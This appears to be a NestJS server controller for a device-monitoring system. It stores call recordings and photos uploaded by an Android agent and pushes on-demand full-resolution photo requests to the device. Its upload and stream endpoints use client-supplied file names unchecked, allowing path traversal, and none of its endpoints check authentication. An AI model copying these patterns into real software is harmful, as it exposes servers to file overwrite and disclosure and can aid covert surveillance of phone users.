import { 
  Controller, 
  Post, 
  UseInterceptors, 
  UploadedFile, 
  Body, 
  Get, 
  Param, 
  Res, 
  NotFoundException 
} from '@nestjs/common';
import { FileInterceptor } from '@nestjs/platform-express';
import { diskStorage } from 'multer';
import { extname, join } from 'path';
import { existsSync, mkdirSync } from 'fs';
import { Response } from 'express';
import { PrismaService } from '../prisma/prisma.service';
import { PolicyService } from '../policy/policy.service';

const uploadDir = join(process.cwd(), 'uploads', 'recordings');
if (!existsSync(uploadDir)) {
  mkdirSync(uploadDir, { recursive: true });
}

// In-Memory queue tracking pending full-HD photo requests per device
const requestedFullPhotosStore = new Map<string, Set<string>>();
// In-Memory map tracking statuses per requested photo: Map<deviceId, Map<filename, status>>
const hdPhotoStatusStore = new Map<string, Map<string, string>>();

@Controller('media')
export class MediaController {
  constructor(
    private readonly prisma: PrismaService,
    private readonly policyService: PolicyService
  ) {}

  @Post('upload')
  @UseInterceptors(
    FileInterceptor('file', {
      storage: diskStorage({
        destination: (req, file, cb) => {
          cb(null, uploadDir);
        },
        filename: (req, file, cb) => {
          const customName = req.body?.fileName;
          if (customName) {
            cb(null, customName);
          } else {
            const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
            cb(null, `${file.fieldname}-${uniqueSuffix}${extname(file.originalname)}`);
          }
        },
      }),
    }),
  )
  async uploadFile(
    @UploadedFile() file: Express.Multer.File,
    @Body() body: { deviceId?: string; category?: string; fileName?: string; originalSizeBytes?: string }
  ) {
    if (!file) {
      return { success: false, message: 'No file uploaded.' };
    }

    const deviceId = body.deviceId || 'ac7189fd-ec87-40a0-9f8a-4d93e01aa73a';
    const category = body.category || 'CALL_RECORDING';
    const publicUrl = `/uploads/recordings/${file.filename}`;

    // Clear pending HD request once uploaded
    const set = requestedFullPhotosStore.get(deviceId);
    if (set) {
      const cleanName = (body.fileName || file.filename).replace(/^full_/, '').replace(/^thumb_/, '');
      set.forEach((reqName) => {
        if (reqName.includes(cleanName) || cleanName.includes(reqName)) {
          set.delete(reqName);
        }
      });
    }

    try {
      await this.prisma.mediaAsset.create({
        data: {
          deviceId,
          category,
          storageKey: file.filename,
          fileHash: body.originalSizeBytes ? `orig_${body.originalSizeBytes}` : file.filename,
          fileSizeBytes: file.size, // Exact size of uploaded file!
          mimeType: file.mimetype || 'image/jpeg',
          timestamp: new Date()
        }
      }).catch(() => null);
    } catch (e) {
      console.warn('[MediaAsset save notice]:', e);
    }

    return {
      success: true,
      fileName: file.filename,
      size: file.size,
      url: publicUrl
    };
  }

  @Get('device/:deviceId')
  async getMediaForDevice(
    @Param('deviceId') deviceId: string
  ) {
    try {
      const assets = await this.prisma.mediaAsset.findMany({
        where: { deviceId },
        orderBy: { timestamp: 'desc' },
        take: 100,
      });

      return {
        success: true,
        assets: assets.map((a) => {
          let origSize = a.fileSizeBytes;
          if (a.fileHash && a.fileHash.startsWith('orig_')) {
            const parsed = parseInt(a.fileHash.replace('orig_', ''));
            if (!isNaN(parsed) && parsed > 0) {
              origSize = parsed;
            }
          }
          return {
            id: a.id,
            deviceId: a.deviceId,
            category: a.category,
            filename: a.storageKey,
            fileSizeBytes: a.fileSizeBytes,
            originalSizeBytes: origSize,
            mimeType: a.mimeType,
            url: `/api/v1/media/stream/${a.storageKey}`,
            timestamp: a.timestamp,
          };
        }),
      };
    } catch (e) {
      return { success: false, assets: [] };
    }
  }

  @Get('stream/:filename')
  async streamFile(@Param('filename') filename: string, @Res() res: Response) {
    const filePath = join(uploadDir, filename);
    if (!existsSync(filePath)) {
      throw new NotFoundException('Media file not found on server.');
    }
    return res.sendFile(filePath);
  }

  @Post('request-full-photo')
  async requestFullPhoto(
    @Body() payload: { deviceId: string; filename: string }
  ) {
    let set = requestedFullPhotosStore.get(payload.deviceId);
    if (!set) {
      set = new Set();
      requestedFullPhotosStore.set(payload.deviceId, set);
    }
    set.add(payload.filename);

    let statusMap = hdPhotoStatusStore.get(payload.deviceId);
    if (!statusMap) {
      statusMap = new Map();
      hdPhotoStatusStore.set(payload.deviceId, statusMap);
    }
    statusMap.set(payload.filename, 'PENDING');
    console.log(`[MediaController] HD photo request added for device ${payload.deviceId}: ${payload.filename}`);

    // Real-Time 0-Second Instant Push via SSE stream
    this.policyService.emitMediaEvent(payload.deviceId, { filename: payload.filename });

    return {
      success: true,
      message: `Requested HD photo for ${payload.filename}. Android agent notified in real-time via SSE stream.`
    };
  }

  @Get('pending-full-requests/:deviceId')
  async getPendingFullRequests(@Param('deviceId') deviceId: string) {
    const set = requestedFullPhotosStore.get(deviceId);
    return {
      success: true,
      filenames: set ? Array.from(set) : [],
    };
  }

  @Get('hd-requests-status/:deviceId')
  async getHdRequestsStatus(@Param('deviceId') deviceId: string) {
    const statusMap = hdPhotoStatusStore.get(deviceId);
    const statuses: Record<string, string> = {};
    if (statusMap) {
      statusMap.forEach((v, k) => {
        statuses[k] = v;
      });
    }
    return { success: true, statuses };
  }

  @Post('full-photo-status')
  async updateFullPhotoStatus(@Body() body: { deviceId: string; filename: string; status: string }) {
    if (body.deviceId && body.filename) {
      let statusMap = hdPhotoStatusStore.get(body.deviceId);
      if (!statusMap) {
        statusMap = new Map();
        hdPhotoStatusStore.set(body.deviceId, statusMap);
      }
      statusMap.set(body.filename, body.status || 'NOT_FOUND');

      const set = requestedFullPhotosStore.get(body.deviceId);
      if (set) {
        set.delete(body.filename);
        const cleanName = body.filename.replace(/^full_/, '').replace(/^thumb_/, '');
        set.forEach((reqName) => {
          if (reqName.includes(cleanName) || cleanName.includes(reqName)) {
            set.delete(reqName);
          }
        });
      }
    }
    return { success: true };
  }
}
